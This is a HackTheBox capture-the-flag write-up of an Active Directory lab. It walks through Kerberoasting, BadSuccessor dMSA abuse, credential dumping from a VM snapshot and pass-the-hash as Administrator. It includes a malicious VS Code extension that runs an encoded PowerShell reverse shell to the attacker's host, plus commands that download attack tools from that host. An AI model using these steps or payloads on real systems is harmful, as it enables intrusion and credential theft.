# Checkpoint — HTB Writeup

**Platform:** HackTheBox  
**Difficulty:** Medium  
**Status:** Complete

**Initial credentials:** `alex.turner / Checkpoint2024!`

---

## Reconnaissance

```bash
silent-scan $TARGET
nmap -sVC -p53,88,135,139,389,445,464,636,3268,3269,5985,9389,49664,49670,49671,49673,49674,49683,49704,54328 $TARGET -oN service
```

**Relevant output:**
```
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-14 03:56:23Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb)
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf            .NET Message Framing
Service Info: Host: DC01; OS: Windows
```

> Windows Domain Controller. WinRM available on port 5985.

---

## SMB Enumeration

```bash
sudo ntpdate -u $TARGET
smbmap -H $TARGET -u 'alex.turner' -p 'Checkpoint2024!'
```

---

Tool notes: [nmap](../../../tools/recon/nmap.md), [smbmap](../../../tools/recon/smbmap.md), [enum4linux](../../../tools/recon/enum4linux.md), [bloodyAD](../../../tools/ad/bloodyad.md), [impacket](../../../tools/windows/impacket.md), [hashcat](../../../tools/creds/hashcat.md).

## User and Group Enumeration

```bash
enum4linux -u 'alex.turner' -p 'Checkpoint2024!' -a $TARGET
awk -F'[][]' '{print $2}' users.txt > clean_users.txt
```

### BloodyAD — alex.turner group membership

```bash
bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --host 10.129.23.75 \
  get object "alex.turner" --attr memberOf
```

```
Employees
IT-Staff
```

### BloodyAD — writable objects

```bash
bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --host 10.129.23.75 \
  get writable

bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --host 10.129.23.75 \
  get writable --otype USER
```

```
distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE
```

> alex.turner has WRITE permissions over **mark.davies**, which is currently in the AD Recycle Bin (Deleted Objects).

---

## Restore Deleted User (mark.davies)

mark.davies exists in the domain but is flagged as deleted under `CN=Deleted Objects`.  
We restore it using the following Python script via impacket:

Full technique: [AD Recycle Bin user restore](../../../exploits/ad/ad-recycle-bin-restore.md).

```python
from impacket.ldap import ldap, ldapasn1

ldc = ldap.LDAPConnection('ldap://10.129.23.75', 'checkpoint.htb', '10.129.23.75')
ldc.login('alex.turner', 'Checkpoint2024!', 'checkpoint.htb', '', '')

# LDAP control to include deleted objects in operations
showDeleted = ldapasn1.Control()
showDeleted['controlType'] = '1.2.840.113556.1.4.417'
showDeleted['criticality'] = True

target_dn = 'CN=Mark Davies\\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
new_dn    = 'CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb'

# Restore: remove isDeleted attribute and update the DN
res = ldc.modify(
    target_dn,
    {
        'isDeleted':         [(1, [])],        # 1 = delete attribute
        'distinguishedName': [(2, [new_dn])]   # 2 = replace
    },
    controls=[showDeleted]
)
print("[*] Result:", res)
```

```bash
python3 restore.py
```

### Enable the account

```bash
bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --host 10.129.23.75 \
  set object "mark.davies" userAccountControl -v 512
```

```
[+] mark.davies's userAccountControl has been updated
```

> `userAccountControl = 512` sets the account as a normal, active user.

---

## Kerberoasting — mark.davies

### Add a fake SPN to mark.davies

mark.davies has no SPN by default. Since alex.turner has WRITE access over mark.davies,
we can assign a fake SPN to make the account kerberoastable:

Full technique: [Kerberoasting](../../../exploits/ad/kerberos-roasting.md).

```bash
bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
  --host $TARGET \
  set object "mark.davies" servicePrincipalName \
  -v "http/checkpoint.htb"
```

### Force etype 23 (RC4) for faster cracking

By default the DC negotiates AES-256 (etype 18), which is significantly slower to crack.  
We force RC4 by modifying `msDS-SupportedEncryptionTypes`:

```bash
# Value 4 = RC4-HMAC only
bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
  --host $TARGET \
  set object "mark.davies" msDS-SupportedEncryptionTypes \
  -v 4
```

| Value | Encryption |
|-------|------------|
| 4     | RC4-HMAC only |
| 8     | AES-128 |
| 16    | AES-256 |
| 23    | RC4 + AES-128 + AES-256 (DC will prefer AES) |

### Request the TGS

```bash
impacket-GetUserSPNs checkpoint.htb/alex.turner:'Checkpoint2024!' \
  -dc-ip 10.129.23.75 \
  -request-user mark.davies \
  -outputfile hash_rc4.txt
```

The resulting hash starts with `$krb5tgs$23$` (RC4).

### Crack with hashcat

```bash
hashcat -m 13100 -a 0 hash_rc4.txt /usr/share/wordlists/rockyou.txt --force
```

```
$krb5tgs$23$*mark.davies$CHECKPOINT.HTB$...:Checkpoint2024!
```

**mark.davies password:** `Checkpoint2024!`

---

## Access as mark.davies

```bash
# Verify share access
smbmap -H 10.129.23.75 -u 'mark.davies' -p 'Checkpoint2024!'
```

**Output**
```
DevDrop   READ, WRITE   VS Code extensions share — approved .vsix packages (VS Code engine 1.118.0)
```

---

## Create a malicious .vsix extension
Full technique: [Malicious VSIX extension RCE](../../../exploits/ad/malicious-vsix-extension-rce.md). Payload reference: [PowerShell reverse shell](../../../payloads/reverse-shells/powershell-tcp.md).

```bash
mkdir evil-ext && cd evil-ext
mkdir -p .vscode
```

### Package.json
```bash
{
  "name": "dev-utils",
  "displayName": "Dev Utils",
  "version": "1.0.0",
  "engines": { "vscode": "^1.118.0" },
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}
```

### extension.js
```bash
const vscode = require('vscode');
const { exec } = require('child_process');

function activate(context) {
    exec('powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAwACwAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA=');
}

function deactivate() {}

module.exports = { activate, deactivate };
```

### Install vsce and create extension
```bash
npm install -g @vscode/vsce
vsce package --allow-missing-repository
```

### Put the malicious extension in the share
```bash
smbclient //$TARGET/DevDrop -U 'checkpoint.htb\mark.davies%Checkpoint2024!' \
  -c "put dev-utils-1.0.0.vsix"
  nc -lvnp 4444
```
----

## Windows enum 
```bash
whoami
```

**Output**
```
checkpoint\ryan.brooks
```
### Uplaod Sharphound
```bash
Invoke-WebRequest -Uri "http://10.10.14.49/SharpHound.exe" -OutFile "$env:TEMP\SharpHound.exe"
cd $env:TEMP
.\SharpHound.exe -c All -d CHECKPOINT.HTB
```

### Put .zip in the smb share
```bash
net use Z: \\10.129.23.75\DevDrop /user:checkpoint.htb\mark.davies Checkpoint2024!
copy *.zip Z:\bloodhound_data.zip
dir Z:\
net use Z: /delete
```

### We have generic write in svc_deploy
```bash
# Check who has permissions over SVC_DEPLOY
Get-DomainObjectAcl -Identity svc_deploy | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser -Identity ryan.brooks).objectsid}

# Verify the object
Get-DomainUser -Identity svc_deploy
```

### Uplaod Rubeus
```bash
Invoke-WebRequest -Uri "http://10.10.14.49/Rubeus.exe" -OutFile "$env:TEMP\Rubeus.exe"
cd $env:TEMP
```

### Get TGT for ryan
```bash
./Rubeus.exe tgtdeleg /nowrap
```

### BadSucessor Enumeration
Full technique: [BadSuccessor dMSA abuse](../../../exploits/ad/badsuccessor-dmsa.md).

```bash
nxc ldap checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -M badsuccessor
```

**Output**
```
BADSUCCE... 10.129.46.221   389    DC01             [+] Found domain controller with operating system Windows Server 2025: 10.129.46.221 (DC01.checkpoint.htb)
BADSUCCE... 10.129.46.221   389    DC01             [+] Found 2 results
BADSUCCE... 10.129.46.221   389    DC01             alex.turner (S-1-5-21-3129162710-3498938529-1807524340-1101), OU=Employees,DC=checkpoint,DC=htb
BADSUCCE... 10.129.46.221   389    DC01             ryan.brooks (S-1-5-21-3129162710-3498938529-1807524340-1103), OU=DMSAHolder,DC=checkpoint,DC=htb                                                         
```

### Convert the ticket format 
```bash
impacket-ticketConverter /tmp/ryan2.kirbi /tmp/ryan2.ccache
# Export the ticket
export KRB5CCNAME=ryan.ccache
```

### Find Write permisions with ryan
```bash
 bloodyad -k ccache=ryan.ccache \ 
--dc-ip $TARGET \ 
--host dc01.checkpoint.htb \
-d checkpoint.htb \
get writable --right WRITE
```

**Output**
```
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
permission: WRITE
```


## Create DMSA
```bash
export KRB5CCNAME=ryan.ccache
bloodyad -k ccache=ryan.ccache \
-u ryan.brooks \
--dc-ip $TARGET \
--host dc01.checkpoint.htb \
-d checkpoint.htb \
add badSuccessor evilDMSA6 \
-t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
--ou "OU=DMSAHolder,DC=checkpoint,DC=htb"
```

**Output**
```
# svc_deploy hash
RC4: e16081eb077aca74bdbf8af12af43ac9
```

## VMBackups Access
```bash
export KRB5CCNAME=evilDMSA6_cD.ccache
nxc smb dc01.checkpoint.htb -k --use-kcache --shares
```

### List shares With svc hash 
```bash
nxc smb dc01.checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares
```
### Download all content in VMBackups
```bash
smbclient //dc01.checkpoint.htb/VMBackups -U svc_deploy --pw-nt-hash
cd NightlyBackup_2024-11-01
cd "memory forensics"
mget *
```
**Output**
```
```

### Dump Creds from vmware snapshot
Full technique: [VM snapshot credential dump](../../../exploits/windows/vm-snapshot-credential-dump.md). Tool note: [Volatility 3](../../../tools/forensics/volatility3.md).

```bash
pipx install volatility3
export VOL=/home/kali/.local/share/pipx/venvs/volatility3/bin/vol
# List al hives
vol -f snapshot.vmem windows.registry.hivelist.HiveList
mkdir dump
# Dump
vol -f snapshot.vmem \
-o dump \
windows.registry.hivelist.HiveList --dump

impacket-secretsdump \
-sam dump/registry.SAM.0xc30a3278e000.hive \
-system dump/registry.SYSTEM.0xc30a2fe38000.hive \
-security dump/registry.SECURITY.0xc30a32789000.hive \
LOCAL
```

### Shell ass admin
```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790be3b Administrator@$TARGET
takeown /F C:\Users\max.palmer\Desktop\root.txt
icacls C:\Users\max.palmer\Desktop\root.txt /grant SYSTEM:F
type C:\Users\max.palmer\Desktop\root.txt
```

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [smbmap](../../../tools/recon/smbmap.md)
- [enum4linux](../../../tools/recon/enum4linux.md)
- [bloodyAD](../../../tools/ad/bloodyad.md)
- [impacket](../../../tools/windows/impacket.md)
- [hashcat](../../../tools/creds/hashcat.md)
- [vsce](../../../tools/devops/vsce.md)
- [Volatility 3](../../../tools/forensics/volatility3.md)
- [AD Recycle Bin user restore](../../../exploits/ad/ad-recycle-bin-restore.md)
- [Kerberoasting](../../../exploits/ad/kerberos-roasting.md)
- [Malicious VSIX extension RCE](../../../exploits/ad/malicious-vsix-extension-rce.md)
- [BadSuccessor dMSA abuse](../../../exploits/ad/badsuccessor-dmsa.md)
- [VM snapshot credential dump](../../../exploits/windows/vm-snapshot-credential-dump.md)
- [PowerShell reverse shell](../../../payloads/reverse-shells/powershell-tcp.md)
